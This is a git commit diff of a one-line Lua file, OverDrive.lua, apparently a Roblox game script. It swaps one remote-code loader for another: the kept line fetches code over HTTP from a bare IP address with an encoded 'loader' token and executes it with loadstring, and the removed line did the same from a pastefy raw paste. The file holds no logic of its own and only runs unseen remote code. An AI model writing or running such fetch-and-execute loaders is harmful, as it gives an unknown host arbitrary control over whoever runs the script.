b3496d283eaad1944d867e5ce569857ad8eae7f3
zorex321 <kfkddikdoddood@gmail.com>
2026-01-20 12:22:39 +0300

    OverDrive.lua

--- OverDrive.lua
+++ OverDrive.lua
@@ -1,2 +1,1 @@
 loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6IjAyNDdjYmZlLTNkYTMtNDdhZC1iMDE3LTQ2MGVhNTg2MmY2MiIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
-loadstring(game:HttpGet("https://pastefy.app/zHaMiyP6/raw"))()
